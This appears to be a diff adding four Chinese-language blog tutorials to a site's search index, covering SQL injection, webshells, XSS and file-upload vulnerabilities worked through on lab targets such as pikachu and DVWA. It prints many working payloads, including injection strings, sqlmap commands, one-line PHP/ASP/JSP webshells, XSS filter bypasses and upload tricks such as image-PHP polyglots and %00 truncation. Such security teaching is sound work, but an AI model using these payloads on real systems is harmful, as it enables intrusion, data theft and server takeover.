@@ -23,4 +23,467 @@
         <tag>我的第一篇博客</tag>
       </tags>
   </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>/2022/04/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>SQL注入原理<br>程序员没有遵循代码与数据分离原则，使用户数据作为代码执行。</p>
+<p>SQL注入条件<br>用户可以控制数据的输入。<br>原本要运行的代码拼接了用户的输入并运行。<br>基本知识（Mysql）<br>注入点检测<br>页面返回正常</p>
+<p>and 1=1–+</p>
+<p>or 1=2–+</p>
+<p>页面返回异常</p>
+<p>and 1=2–+</p>
+<p>or 1=1–+</p>
+<p>添加 sleep(3)看页面是否返回时间长</p>
+<p>其他<br>关于select、union、limit、database等sql语句及函数我都放在了这篇文章，如果您对基本函数还不了解，可以先看下面的文章。</p>
+<p>网络安全-Mysql注入知识点</p>
+<p>文中有使用sqlmap，关于sqlmap的内容，可以查看网络安全-sqlmap学习笔记</p>
+<p>基本流程</p>
+<p>sql注入流程图<br>SQL注入技术</p>
+<p>sql注入技术<br>先按照sqlmap的分类（BUETSQ），然后是其他，由易到难，使用靶机pikachu。</p>
+<p>Union注入攻击<br>利用union查询来运行想要的sql语句</p>
+<p>字符型注入，目标：获取当前数据库中的所有用户名及其他感兴趣的信息。</p>
+<p>注入点判断<br>d’ and 1=1#</p>
+<p>返回正常<br> 字符型注入点，使用单引号闭合即可</p>
+<p>字段判断<br>order by 1和2时没有问题</p>
+<p>d’ order by 3#</p>
+<p>order by 3出错<br>字段数为2，有回显，union没有被过滤，使用Union注入</p>
+<p>sql语句猜测，从某个表根据用户名返回两个字段</p>
+<p>select field1,field2 from table where 用户名 = ‘’</p>
+<p>查询当前数据库<br>当前的用database()函数即可</p>
+<p>d’ UNION SELECT 1,database() from information_schema.schemata#</p>
+<p>获取数据库<br> 得到数据库名pikachu</p>
+<p>查询表名<br>d’ UNION SELECT 1,table_name from information_schema.tables where table_schema=’pikachu’#<br>查询到的表</p>
+<p>数据库的表<br>得到表名httpinfo、member、message、users、xssblind</p>
+<p> 查询列名<br>根据我们的目标，假设对member感兴趣</p>
+<p>d’ UNION SELECT 1,column_name from information_schema.columns where table_schema=’pikachu’ and table_name=’member’#</p>
+<p>列名<br> users表中有id、username、pw、phonenum、address、email</p>
+<p>通过以上信息，猜测sql语句</p>
+<p>select id,email from member where username = ‘’</p>
+<p>查询所需字段值<br>有了username就可以通过他给的表单获取对应email，所以就假设我们对phone、address更感兴趣，0x3a是冒号</p>
+<p>d’ UNION SELECT 1,group_concat(username,0x3a,phonenum,0x3a,address) from member#</p>
+<p>得到数据<br>你可以尝试以下查询 vince。</p>
+<p>Error注入攻击<br>如果union被过滤，可以使用基于错误的注入攻击，一般利用floor，updatexml, extractvalue函数、还有exp和一些几何函数，补充exp：Error Based SQL Injection Using EXP | 🔐Blog of Osanda。利用了”DOUBLE value is out of range”。</p>
+<p>Floor函数报错</p>
+<p>关键函数：<br>Rand() ——-产生0~1的伪随机数<br>Floor() ——-向下取整数<br>Concat() —–连接字符串<br>Count() ——计算总数</p>
+<p>Payload如下：<br>Select count(*),concat(PAYLOAD,floor(rand(0)*2))x from 表名 group by x;</p>
+<p>floor和rand(0)产生重复序列<br> 根据x字段进行分组，统计x的个数</p>
+<p>group by key 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。（插入数据时，会再计算rand值）</p>
+<p>如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
+<p>爆数据库lady_killer9。</p>
+<p>这里利用updatexml函数，报错原理简单，第二个不是XPATH类型字符串就报错。</p>
+<p>一般使用如下结构,sql是你想运行的sql语句。</p>
+<p>updatexml(1,concat(0x7e,(sql),0x7e),1)</p>
+<p>0x7e是~，使用char(126)也是一样的，concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出sql语句运行后的结果。</p>
+<p>sqlmap集成<br> sqlmap集成了上述的三种方式，同时还有其他的</p>
+<p>字符型注入，目标：获取当前数据库中的users表中的所有用户名及其他感兴趣的信息。</p>
+<p>注入点和字段数判断同上，已知：</p>
+<p>字符型注入点，使用单引号闭合即可</p>
+<p>字段数为2，有回显，updatexml没有被过滤，使用报错注入</p>
+<p>查询表名<br>d’ and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#<br>注意，结果只能是一行，所以使用了limit 0,1获得第一个表</p>
+<p>结果<br>当sql语句是使用 limit 3,1是时候就可以得到了users表。</p>
+<p> 查询列名<br>d’ and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),0x7e),1)#</p>
+<p>第一个列名<br>同样，当sql语句是使用 limit 1,1、limit 2,1、limit 3,1时，就得到了username、password、level三个列名。</p>
+<p>查询所需字段值<br>假设我们对username和password感兴趣</p>
+<p>d’ and updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) from users limit 0,1),0x7e),1)#</p>
+<p>结果<br>当然密码加了密，剩下的交给搞Cryto的人吧。可以看出报错注入攻击比较麻烦，如果有回显，union没有被过滤，还是优先使用union注入攻击。</p>
+<p>—————————————-没有回显—————————————————</p>
+<p>接下来就是难度中等的了，没有回显，采用盲注</p>
+<p>Boolean注入攻击<br>基于布尔判断的攻击</p>
+<p>根据前面知道有个用户名是vince。</p>
+<p>vince’ and length(database())=7#</p>
+<p>没有错误<br>此时，条件语句where username=’vince’ and length(database())=7是True，也就是说数据库长度为7。</p>
+<p>vince’ and substr(database(),1,1)=’p’#</p>
+<p>字符<br>vince’ and ascii(substr(database(),1,1))=112#</p>
+<p>ascii<br>vince’ and ascii(substr(database(),2,1))=105#<br>上面是数据库名第二字符’i’的，数据库名出来后再将database()改为select语句去找表名等，一般是写脚本，一个个的手工判断时间太长，有时间写了脚本再来更新，或者使用sqlmap。</p>
+<p>python sqlmap.py -u “<a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a> –technique=B -dbms mysql –threads 5 -v 3 -dbs –batch</p>
+<p>基于boolean的<br>使用的是MID函数，和substr一样。在网络安全-Mysql注入知识点中有这个函数的用法。</p>
+<p>Time注入攻击<br>基于时间的攻击，利用if、sleep、benchmark、get_lock等函数，使用rpad或repeat构造长字符串，加RLIKE，利用多个大表的笛卡尔积。</p>
+<p>GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，这种绕过方法是存在限制条件的，即数据库的连接必须是持久连接</p>
+<p>vince’ and if(length(database()=7),sleep(3),1)#</p>
+<p>3秒后后显示<br>同样，也是写脚本，通过返回的时间长短判断，可使用sqlmap。</p>
+<p>python sqlmap.py -u “<a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a> –technique=T –time-sec 2 -dbms mysql –threads 5 -v 3 -dbs –batch</p>
+<p>时间注入<br> 太慢了，有其他办法不建议使用这个。</p>
+<p>Stack注入攻击<br>需要后台代码是可以执行多条sql语句的，php中是使用PDO方式执行多条语句。</p>
+<p>堆叠注入攻击可以执行多条语句，多语句之间以分号隔开。利用这个特点可以在后面的语句中构造自己要执行的语句。</p>
+<p>获取数据库、表（单引号闭合）</p>
+<p>‘;show databases;show tables;%23</p>
+<p>sqlmap<br> 可以看到sqlmap中注入技术选择S时，payload中是含分号的。</p>
+<p>————————————–接下来是比较特殊/高级的sql绕过注入——————————–</p>
+<p>inline Query绕过注入攻击<br>内联查询注入攻击</p>
+<p>宽字节绕过注入<br>宽字节是在一些特定的编码，如GBK中才有的，编码将两个字节认为是一个汉字（前一个字符ascii码要大于128，才到汉字的范围）。addslashes函数为了防止sql注入，将传入参数值进行转义，将’ 转义为&#39;，单引号失去作用。因此，我们需要将\给绕过，这样才可以加’号。</p>
+<p>&#39;编码<br>\编码为%5C,我们一般在地址后添加%df。</p>
+<p>绕过<br>添加后\变成了汉字，这样就绕过了。之后就和前面的一样了，当然，还有双引号等，除了GBK还有GB2312等编码，有兴趣的可以整理一下所有的。</p>
+<p>为了方便理解，修改一下源代码，打印一下sql语句 。</p>
+<p>修改源代码</p>
+<p>转义<br>%df%5C%27 or 1=1#<br> 后端及数据库设置字符集为GBK，或其他低位为%5C的字符集。</p>
+<p>Pikachu其他题目<br>火狐浏览器及插件hackbar v2。</p>
+<p>数字型注入<br>参数为数字，一般是id等。</p>
+<p>参数<br>参数为id和submit，其中id为整型。</p>
+<p>猜测sql语句形式为</p>
+<p>select userid from users where id = 参数</p>
+<p> 注入点判断<br>id=1 and 1=1&amp;submit=查询<br>id=1 and 1=2&amp;submit=查询<br>字段数确定<br>id=3 order by 3&amp;submit=查询</p>
+<p>3时报错<br> 我就从2开始的，靶机的一般不会太大。真实的网络实战的话还是自己写脚本或使用sqlmap。</p>
+<p>查询当前数据库<br>id=1 union select 1,database()&amp;submit=查询</p>
+<p>数据库pikachu<br>查询当前表<br>由于火狐对hackbar的一些限制，插件无法正常运行sql语句，就使用Navicat了。如果你不是最新版火狐的话可以试一试。</p>
+<p>post data应该是这样的</p>
+<p>UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=database()&amp;submit=查询<br>实际sql语句执行是这样的</p>
+<p>查询表<br>查询当前列<br>post data应该是这样的</p>
+<p>id=1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=’member’&amp;submit=查询<br>实际sql语句执行是这样的</p>
+<p>当前列<br>查询当前字段<br>post data应该是这样的</p>
+<p>id=1 UNION SELECT 1,group_concat(username,0x3a,phonenum,0x3a,address) from member&amp;submit=查询<br>实际sql语句执行是这样的</p>
+<p>用户名，手机号，住址<br>0x3a是冒号的ASCII码</p>
+<p>一次手工注入的基本过程如上所述，接下来大部分只讲原理，有特殊的地方再提示。</p>
+<p>字符型注入<br>将参数以字符或字符串形式读入，通过闭合+注释的方式来进行SQL注入，一般是’或”，或者结合()。</p>
+<p>判断闭合</p>
+<p>标题<br>获取数据<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d&#39;union">http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d&#39;union</a> select 1,database()–+&amp;submit=%E6%9F%A5%E8%AF%A2</p>
+<p>获取数据库名<br>后面的和之前的差不多。</p>
+<p>搜索型注入<br>其实也算是字符型注入</p>
+<p>搜索一般sql语句如下，</p>
+<p>select * from users where username like ‘%$name’</p>
+<p>测试闭合字符<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=frankyu&#39;or">http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=frankyu&#39;or</a> 1=1–+&amp;submit=%E6%90%9C%E7%B4%A2</p>
+<p>获取所搜索表所有内容<br>使用’or 1=1，条件判断为TRUE，所有的都返回，想获取其他的你就从前面常用语句去粘贴就行了。</p>
+<p>xx型注入<br>注入判断</p>
+<p>frankyu’判断<br>我还以为书上没写的呢，其实还是字符型，只不过需要两个字符去闭合，就是前面提到的()，sql语句类型下面这种。</p>
+<p>select * from users where username = (‘$name’)</p>
+<p>不写了，和前面的差不多。</p>
+<p> “insert/update”注入</p>
+<p>标题<br>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)and’<br>0x7e是~，结果如下：</p>
+<p>数据库<br>“delete注入”<br>和上面的差不多,id那里可以报错注入，可以使用Burpsuite进行抓包。</p>
+<p>宽字节注入<br>博主数据库编码设置的utf-8，就不演示了，其实除了加一个%df外也没什么特别的地方，也可以使用其他的，sqlmap中有temper脚本进行绕过，使用的是%bf。</p>
+<p>tamper脚本<br>绕过<br>大小写绕过<br>sql语句对一些关键词不区分大小写，如果网站代码没有进行大小写检查可以使用</p>
+<p>UniOn select * from user</p>
+<p>双写绕过<br>网站代码找到关键词后删除，可以通过双写构造删除后符合语法的sql语句</p>
+<p>selselectect * from user</p>
+<p>内联注释<br>mysql扩展功能，在/*后加惊叹号，注释中的语句会被执行</p>
+<p>and /<em>!select * from user</em>/</p>
+<p>注释符绕过<br>注释符不影响语句的连接，</p>
+<p>sel/**/ect * from user</p>
+<p>or/and绕过<br>使用逻辑符号代替：and = &amp;&amp;, or = ||</p>
+<p>select * from emp where sal &gt; 500 &amp;&amp; sal &lt; 3000;</p>
+<p>空格绕过<br>有的网站过滤了空格，可以尝试使用</p>
+<p>%0a、%b、%0c、%0d、%09、%a0</p>
+<p>或者</p>
+<p>/**/、()</p>
+<p>例如</p>
+<p> select * from/**/emp where (sal) &gt; 500 &amp;&amp; sal &lt; 3000;</p>
+<p>等价于</p>
+<p>  select * from emp where sal &gt; 500 and sal &lt; 3000;</p>
+<p>防御SQL注入的方法<br>使用预编译语句<br>绑定变量，攻击者无法改变SQL的结构。不同的编程语言Java、Php有不同的语法，就不做展示了。在网络安全-php安全知识点中提到了使用pdo来防御。</p>
+<p>使用存储过程<br>使用安全的存储过程对抗SQL注入，由于存储过程中也可能存在SQL注入问题，应尽量避免使用动态SQL语句。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>webshell</title>
+    <url>/2022/04/22/webshell/</url>
+    <content><![CDATA[<p>简介<br>Webshell是通过服务器开放的端口获取服务器的某些权限。</p>
+<p>webshell又称脚本木马，一般分为大马、小马、一句话木马。</p>
+<p>大马，体积大、功能齐全、能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权。</p>
+<p>小马，一般而言，我们在上传文件的时候，会被限制上传的文件大小或是拦截的情况，那么我通过小马来上传大马，实现我们想要的功能。</p>
+<p>一句话木马，短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理webshell。</p>
+<p>原理<br>利用文件上传漏洞、SQL注入漏洞、RCE漏洞等，将恶意文件放到web服务器中，也就是常说的”后门”，之后可以进行文件管理、数据库管理、远程命令执行、提权等恶意操作。</p>
+<p>常见一句话木马<br>php<br><?php @eval($_POST[value]); ?><br><?php assert($_POST[value]);?><br><?php
+@preg_replace("/[email]/e",$_POST['h'],"error");
+?><br>asp<br>&lt;%eval request (“value”)%&gt;<br>&lt;% execute(request(“value”)) %&gt;<br>aspx<br>&lt;%@ Page Language=”Jscript” %&gt; &lt;% eval(Request.Item[“value”]) %&gt;<br>jsp<br>&lt;%<br>if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(“\“)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());<br>%&gt;<br>攻击<br>靶机：pikachu</p>
+<p>工具：中国蚁剑</p>
+<p>首先，利用文件上传漏洞，上传webshell文件</p>
+<p>网络安全-文件上传漏洞的原理、攻击与防御_lady_killer9的博客-CSDN博客</p>
+<p>文件为eval.php，内容为</p>
+<?php eval($_POST['eval']); ?>
+
+<p> 之后利用中国蚁剑连接网站，空白处右键-&gt;添加数据</p>
+<p>添加数据</p>
+<p>添加数据成功</p>
+<p>上传文件及其他功能</p>
+<p>终端控制<br> 再打开上传webshell的那个目录，可以看到多出来了%SystemDrive%目录， </p>
+<p>目录变化<br>至此，可以进行文件管理，虚拟终端等。</p>
+<p>WebShell管理工具<br>Cknife 中国菜刀<br>antSword 中国蚁剑<br>冰蝎 动态二进制加密网站管理客户端<br>weevely3 Weaponized web shell<br>Altman the cross platform webshell tool in .NET<br>Webshell Sniper Manage your website via terminal<br>quasibot complex webshell manager, quasi-http botnet<br>webshell隐藏<br>隐藏到日志</p>
+<p>例如，修改发送数据包的头部，添加webshell。 web服务器一般会保存访问记录到Web日志，若找到web日志，且放到可执行目录下，可能获得shell。</p>
+<p>隐藏到合法文件</p>
+<p>例如，文件上传漏洞中，将php代码放到jpg文件中，可以使用@运算符，以防发生任何错误。</p>
+<p>混淆</p>
+<p>删除空格、换行符等，导致代码文件比较乱，使用编码或加密来隐藏掉恶意函数名等。</p>
+<p>检测与防御<br>静态检测<br>web日志</p>
+<p>在对日志文件进行预处理后，对日志记录进行文本特征匹配、统计特征计算与文件关联性分析，最后对检测结果汇总，列出疑似的Webshell文件。</p>
+<p>例如，网站目录下某php文件访问量过少，且来源ip固定。</p>
+<p>动态检测</p>
+<p>webshell传到服务器了，黑客总要去执行它吧，webshell执行时刻表现出来的特征，我们称为动态特征。</p>
+<p>例如，webshell如果执行系统命令的话，会有进程。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>xss攻击</title>
+    <url>/2022/04/22/xss%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<p>简介<br>跨站脚本攻击(全称Cross Site Scripting,为和CSS（层叠样式表）区分，简称为XSS)是指恶意攻击者在Web页面中插入恶意javascript代码（也可能包含html代码），当用户浏览网页之时，嵌入其中Web里面的javascript代码会被执行，从而达到恶意攻击用户的目的。XSS是攻击客户端，最终受害者是用户，当然，网站管理员也是用户之一。<br>XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。</p>
+<p>php中常见的输出函数有：</p>
+<p>echo<br>printf<br>print<br>print_r<br>sprintf<br>die<br>var-dump<br>var_export<br>所用工具<br>Google出品：开源Web App漏洞测试环境：Firing Range</p>
+<p>靶机:dvwa、pikachu</p>
+<p>XSS的类型<br>反射型XSS/不持久型XSS<br>选择的是echo函数，不加过滤，直接输出</p>
+<p>input.php</p>
+<?php 
+$input = $_GET['input'];
+echo 'output:<br>'.$input;
+?><p>显示<br>可以看到我们的输入直接被输出。 那么，如果我们的参数是JavaScript代码呢？</p>
+<script>alert('xss attack by lady_killer9')<script>
+
+js代码执行
+也就是说js能够做到的事情，都可在这里插入去实现，比如跳转到钓鱼网站。
+
+ Firing Range的Html Body存在的反射型XSS
+
+
+反射性XSS攻击之html Body
+
+脚本插入
+下面是在dvwa中的展示
+
+
+插入js代码
+
+提交
+
+查看网页源代码
+存储型XSS/持久型XSS
+和反射型XSS的即时响应相比，存储型XSS则需要先把代码保存到数据库或文件中，下次读取时仍然会显示出来，利用的问题依然是没有对用户的输入进行过滤。使用靶机pikachu的存储型xss。
+
+“<script>alert(document.cookie)<script>”
+
+XSS注入
+
+注入成功
+
+注入后留言列表
+基于DOM的XSS
+基于文档对象模型(Document Object Model，DOM)的一种漏洞。客户端的脚本可以通过DOM动态地修改页面内容，它不依赖于提交数据到服务器，而是从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM型XSS漏洞。
+
+没了解过DOM的可以看一看HTML DOM教程
+
+HTML DOM就像数据结构中的树，有根节点，叶子节点等，通过document对象进行写入。
+
+
+F12查看源代码
+使用F12查看，发现是把id为text的输入框的内容显示出来。单引号闭合即可，而且F12的时候就直接看见了。
+
+提示给的是
+
+'onclick="alert('lady_killer9')">
+我使用的是
+
+'onclick='alert('lady_killer9')
+
+注入成功
+常用Payload与工具
+XSS扫描工具
+XSStrike
+beef
+XSS Scanner Online
+XSSer
+xsscrapy
+BruteXSS Terminal
+BruteXSS GUI
+工具不在于多，学一个就可以了，我学习的是第一个网络安全-XSStrike中文手册（自学笔记）。
+
+Payloads
+script标签类
+对于没有过滤的很简单的XSS漏洞，可以使用
+
+“<script>alert(“XSS”)</script>”
+<p>有的时候会过滤掉script，大小写、双写等无法绕过，可使用后面的payload。</p>
+<p>结合js的html标签<br>可结合一些onclick、onerror等事件</p>
+<p>&lt;IMG οnmοuseοver=”alert(‘xxs’)”&gt;</p>
+<p>&lt;img src=xss οnerrοr=alert(1)&gt;</p>
+<p>伪协议<br>上面的都不行的话，可以试试伪协议</p>
+<IFRAME src="javascript:alert(1);"><IFRAME>
+
+<IMG dynsrc="javascript:javascript:alert(1)">
+
+<p>绕过<br>大小写绕过</p>
+<scRipt>alert(“XSS”)<scRipt>
+
+双写绕过
+
+<scrscriptipt>alert(“XSS”)<scrscriptipt>
+
+html编码绕过
+
+<script>alert(“XSS”)<script>
+
+等价于
+
+<script>alert("XSS")<script>
+
+<a href=javascript:alert(2)>a</a>
+
+等价于
+
+<a href=javascript:alert(2)>a</a>
+
+如果你还不了解常见编码，可查看：网络安全-WEB中的常见编码 
+
+标签优先级绕过
+
+<noscript >标签比<img>标签解析优先性更高，所以</noscript >会优先闭合，导致<img>标签逃逸，从而造成xss执行
+
+<noscript><img src="asdasd</noscript><img src=* οnerrοr=prompt(1)>"></noscript>
+
+危害
+用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。
+攻击者能够在一定限度内记录用户的键盘输入。
+攻击者通过CSRF等方式以用户身份执行危险操作。
+XSS蠕虫。
+获取用户浏览器信息。
+利用XSS漏洞扫描用户内网。
+防御
+标签过滤
+事件过滤
+敏感字符过滤
+设置httponly防止Cookie被获取
+内容安全策略（CSP）
+在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码
+在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码
+在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码
+在将不可信数据插入到Style属性里时，对这些数据进行CSS编码
+当然，如果过过滤不全，或者CSP配置错误，也可能被绕过。
+
+------------------------------------20210821补充--------------------------------------
+
+知乎-如何通过XSS获取http-only保护的Cookie
+
+在线XSS挑战：XSS平台|CTF欢迎来到XSS挑战|XSS之旅|XSS测试
+
+XSS Challenges：XSS Challenges
+
+XSS Payload：https://github.com/payloadbox/xss-payload-list
+
+OWASP XSS过滤备忘单：Redirecting…
+
+
+</scRipt></IMG></IFRAME></IFRAME>]]></content>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2022/04/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>介绍<br>文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而WEB系统没有进行检测或逻辑做的不够安全。文件上传功能本身没有问题，问题在于上传后如何处理及解释文件。</p>
+<p>分类<br>根据简介，主要分为上传（客户端）、解析（服务端）两大类。</p>
+<p>上传-javascript检测<br>简介<br>通过js代码，对文件后缀进行判断。</p>
+<p>原理<br>一般使用白名单或黑名单的方式，判断文件后缀，根据后缀决定用户是否上传。</p>
+<p>攻击<br>Firebug插件删除判断函数</p>
+<p>使用靶机pikachu做例子，直接通过F12修改。</p>
+<p>tupian.php</p>
+<?php
+    echo phpinfo();
+?>
+
+
+<p>js检测到不符合要求<br> F12查看代码</p>
+<p>checkFileExt<br> 客户端通过onchange实践的checkFileExt函数进行检测，我们删除掉调用这个函数的部分。</p>
+<p>删除后<br>我们再次上传tupian.php</p>
+<p>文件上传成功<br>可以看路径，我们修改上方的url，进行访问。</p>
+<p>代码已运行<br>可以看到代码已经运行。</p>
+<p>中间人攻击-burpsuite拦截</p>
+<p>文件名符合规则，使用burpsuite拦截后，修改文件后缀即可。方法类似下方MIME攻击</p>
+<p>防御<br>上传无法防御，可以进行文件重命名。</p>
+<p>上传-MIME检测<br>简介<br>js的检测基本没有了，开始使用后端代码进行检测，虽然进行MIME检测是使用的后端代码，但是，依然是从客户端获取的，可以从客户端修改，我还是归于上传这一类了。</p>
+<p>简单来说，在请求头中Content-Type:type/subtype来表明类型，常见的有</p>
+<p>text/plain<br>text/html<br>image/jpeg<br>image/jpg<br>image/png<br>audio/mpeg<br>audio/ogg<br>audio/*<br>video/mp4<br>application/*<br>application/json<br>application/javascript<br>application/ecmascript<br>application/octet-stream<br>攻击<br>中间人攻击-burpsuite拦截</p>
+<p>burpsuite拦截</p>
+<p>修改Content-Type</p>
+<p>Forward<br> 可以看到发送过去了，后序验证同上，不再重复截图。</p>
+<p> 防御<br>上传无法防御，可以进行文件重命名。</p>
+<p>上传-后端文件格式检测<br>简介<br>一些后端代码含有一些函数，能够判断文件类型，获取文件的一些信息。以php为例，php的getimagesize函数可以获取图像的一些信息，如果不是图像，那么无法获取信息，就会报错。</p>
+<p>有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</p>
+<p>类型    二进制值<br>JPG    FF D8 FF E0 00 10 4A 46 49 46<br>GIF    47 49 46 38 39 61<br>PNG    89 50 4E 47<br>TIF    49 49 2A 00<br>BMP    42 4D<br>原理<br>如果你学过图像相关的课程，比如信息隐藏这门课，会使用Matlab读取图像，进行信息隐藏，你就会知道图像的一些格式，符合格式的话就是那个类型的文件，一般是头部的一些字节。我们通过将恶意代码前面添加其他类型文件的头部就可以伪造成另一个类型，进而绕过检测。</p>
+<p>攻击<br>我们修改tupian.php为tupian.php.jpg，进行上传。</p>
+<p>图片格式检测<br> 可以看到，图片没有办法上传，虽然后缀对，但是内部是不正确的。</p>
+<p>我们使用Linux中的xxd或od命令来查看.PNG或.png图片的信息（博主虽然是在Windows中，但是使用的是cygwin）。</p>
+<p>2.PNG</p>
+<p>ca.png<br>可以看到文件前面是一样的。</p>
+<p>使用cmd命令 copy /b CA.png + tupian.php tupian.png</p>
+<p>生成新图片<br>目录下会生成新图片tupian.png，而且符合png格式，但是在图片后面是php代码。</p>
+<p>上传成功</p>
+<p>打开<br>图片上传成功，但是打开后还是图片。</p>
+<p>我们再使用之前的文件包含漏洞就可以了，注意url。</p>
+<p>php代码运行成功<br>php由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</p>
+<p>jsp引擎则可能会解析 jspx / jspf / jspa / jsw / jsv / jtml 等后缀</p>
+<p>asp支持 asa / asax / cer / cdx / aspx / ascx / ashx / asmx / asp{80-90} 等后缀。</p>
+<p>除了这些绕过，其他的后缀同样可能带来问题，如 vbs / asis / sh / reg / cgi / exe / dll / com / bat / pl / cfc / cfm / ini 等。</p>
+<p>防御<br>若没有文件包含漏洞，问题不大，否则无法防御。</p>
+<p>上传-文件截断<br>简介<br>php %00截断，由于00代表结束符，00后面的所有字符都会删除掉，发生在php5.3.4之前版本，php的magic_quotes_gpc为OFF状态。</p>
+<p>攻击</p>
+<p>php版本调整为5.3.29</p>
+<p>参数设置<br>正好被水印挡住了，挡住的部分就是参数magic_quotes_gpc。</p>
+<p>解析-Apache文件解析<br>一个文件可以有多个后缀，如：lady_killer.txt.png.mp3，在Windows中自然是认为这是mp3文件，也就是说最后的后缀生效。但是，Apache却是从右向左读后缀，不认识的跳过继续读，前面的文件就认为是图片，如果没有配置mp3后缀的话。因此，对于</p>
+<p>tupian.php.xxx就会认为这是php文件。类型的定义在Apache/conf/mime.types中</p>
+<p>解析-IIS文件解析<br>IIS 6也出现截断攻击，截断字符为”;”。由于phpStudy没有这个版本，太老了，不想去实现了，知道下就行了。</p>
+<p>解析-PHP CGI路径解析<br>没找到了2010年的cve，可能是提交的bug吧，就是路径为evil.jpg/1.php时，Nginx会把evil.jpg当做php文件交给php运行。</p>
+<p>Nginx + PHP CGI的一个可能的安全漏洞 - 风雪之隅</p>
+<p>绕过<br>前端绕过</p>
+<p>通过抓包提交，绕过前端js检测，删除对js验证脚本的调用，使其不能对上传的文件类型做检测，从而达到绕过</p>
+<p>黑名单绕过</p>
+<p>使用更多后缀</p>
+<p>jsp jspx jspf</p>
+<p>asp asa cer aspx</p>
+<p>php php3 php4 pht phtml</p>
+<p>后缀大小写绕过</p>
+<p>由于windows不区分大小写，后端校验未使用strtolower等函数将文件后缀大小写统一处理，导致黑名单不完整而绕过</p>
+<p>1.pHP</p>
+<p>后缀双写绕过</p>
+<p>后端过滤时，使用了preg_replace等替换函数将php关键字替换为空，但是却没有循环替换，导致前面的ph和后面的p重新组合成php，从而导致绕过</p>
+<p>1.phphpp</p>
+<p>空格绕过</p>
+<p>由于Windows处理文件时，会自动删除文件后缀带有的空格和点，从而导致绕过。</p>
+<p>1.php</p>
+<p>后面有空格</p>
+<p>::$DATA绕过</p>
+<p>Windows的一种流文件格式，上传这种格式流文件格式的同时会在相同目录下生成一个含有相同内容宿主文件</p>
+<p>MIME绕过</p>
+<p>修改Content-Type中为允许的类型，以下为常见MIME类型</p>
+<p>GIF image/gif<br>JPG image/pjpeg image/jpeg<br>ZIP application/x-compressed application/octet-stream<br>JSP text/html<br>EXE application/octet-stream<br>%00截断绕过</p>
+<p>PHP&lt;5.3.29，且GPC关闭时，%00在URL中充当结束符，当解析到%00时，解析器就会认为字符串已经读取完毕</p>
+<p>1.php%00a.jpg</p>
+<p>十六进制的0x00也可</p>
+<p>文件头检查绕过</p>
+<p>例如，仅允许上传图片，通过文件头来判断，这时可以将恶意代码拼接到图片后面</p>
+<p>条件竞争绕过</p>
+<p>有的文件上传功能是先将文件下载到服务器，如果是有问题的就删除，我们可以利用这一逻辑漏洞，不断上传文件，即可访问。</p>
+<p>可查看文章CTF-【NSCTF 2015】WEB11 条件竞争</p>
+<p>解析绕过</p>
+<p>解析漏洞<br>服务    举例    原理<br>IIS6.0</p>
+<p>test.asp/1.jpg</p>
+<p>test.asp;1.jpg</p>
+<p>*.asp目录下的所有文件都会当做asp脚本执行</p>
+<p>文件被截断，被解析为test.asp</p>
+<p>IIS7.0和IIS7.5</p>
+<p>a.jpg/a.php</p>
